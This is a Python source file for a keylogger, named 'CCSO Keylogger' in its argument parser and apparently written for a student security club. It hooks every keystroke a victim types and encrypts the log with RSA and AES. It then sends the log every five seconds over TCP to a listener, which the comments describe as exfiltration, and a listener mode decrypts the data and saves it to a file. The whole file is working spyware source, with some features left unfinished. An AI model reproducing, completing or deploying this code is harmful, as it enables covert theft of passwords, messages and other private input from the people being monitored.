import argparse
import textwrap
import keyboard
import sys
import socket
import threading
import zlib
import base64
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from io import BytesIO
from datetime import datetime

# Classes for good python developer standards :)!
class Keylogger:
    def __init__(self):
        self.args = args
        self.log = ""
        self.interval = 5
        self.master_log = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Handles the keyboard events, called whenever there is a keypress
    def callback(self, event):
        name = event.name

        # Format specific characters
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def init_conn(self):
        # Check if there is already a socket connection, if there is, do nothing
        try:
            self.socket.connect((self.args.target, self.args.port))
        except:
            print("Error on socket creation")
            sys.exit(1)

        # TODO listener will reply with the public key, need to make logic to save it
        self.socket.send("REQ_PUB".encode())

        buf = b""
        while True:
            data = self.socket.recv(4096)
            if data:
                buf += data
                self.public_key = buf.decode()
                break

    # Send log over the network
    def send_log(self):
        self.master_log += self.log

        if self.log:
            # Ending timestamp
            self.end_time = datetime.now()

            # If there is keystrokes to send, send them :^)
            if self.log:
                payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n"
                self.socket.send(self.encrypt(payload))

        self.log = ""

        # Create a timer to repeatedly exfiltrate data
        timer = threading.Timer(interval=self.interval, function=self.send_log)
        timer.start()

    # TODO
    '''
    Only listener generates keys client will send a heartbeat to the
    listener and have the listener send the public key to encrypt with
    '''
    def generate_keys(self):
        new_key = RSA.generate(2048)
        self.private_key = new_key.exportKey()
        self.public_key = new_key.publickey().exportKey()

    def get_rsa_cipher(self, key):
        rsakey = RSA.importKey(key)
        return (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())

    def encrypt(self, plaintext):
        compressed_text = zlib.compress(plaintext.encode())

        session_key = get_random_bytes(16)
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)

        cipher_rsa, _ = self.get_rsa_cipher(self.public_key)
        encrypted_session_key = cipher_rsa.encrypt(session_key)

        msg_payload = encrypted_session_key + cipher_aes.nonce + tag + ciphertext
        encrypted = base64.encodebytes(msg_payload)

        return encrypted

    def decrypt(self, encrypted):
        encrypted_bytes = BytesIO(base64.decodebytes(encrypted))
        cipher_rsa, keysize_in_bytes = self.get_rsa_cipher(self.private_key)

        encrypted_session_key = encrypted_bytes.read(keysize_in_bytes)
        nonce = encrypted_bytes.read(16)
        tag = encrypted_bytes.read(16)
        ciphertext = encrypted_bytes.read()

        session_key = cipher_rsa.decrypt(encrypted_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)

        plaintext = zlib.decompress(decrypted)
        return str(plaintext)

    # For the listener - handle a received a conncetion
    def handle(self, client_socket):
        print("[+] Receieved Connection")
        buf = b""
        # Receive all the bytes and write them to a file
        while True:
            data = client_socket.recv(4096)
            if data:
                buf += data
            else:
                break

            # TODO Transfer keys on initial connnection
            if buf.decode() == "REQ_PUB":
                print("Received REQ_PUB")
                client_socket.send(self.public_key)
                buf=b""
            else:
                with open(self.args.outfile, "w") as f:
                    f.write(self.decrypt(buf))
                    print(f"[+] Wrote data to {self.args.outfile}")

    # Create the listener to receive exfiltrated data
    def listen(self):
        self.generate_keys()
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print("[+] Listener started")

        # When there is a connection
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    # Start the keylogger
    def start(self):
        if self.args.listen:
            self.listen()
        else:
            # Initialize keylogger
            try:
                self.time = datetime.now()
                keyboard.on_release(callback=self.callback)
                self.init_conn()
                self.send_log()
                keyboard.wait()

            # Handle a CTRL-C
            except KeyboardInterrupt:
                sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
        do this later :)
    '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
    parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')

    args = parser.parse_args()

    kl = Keylogger()
    kl.start()
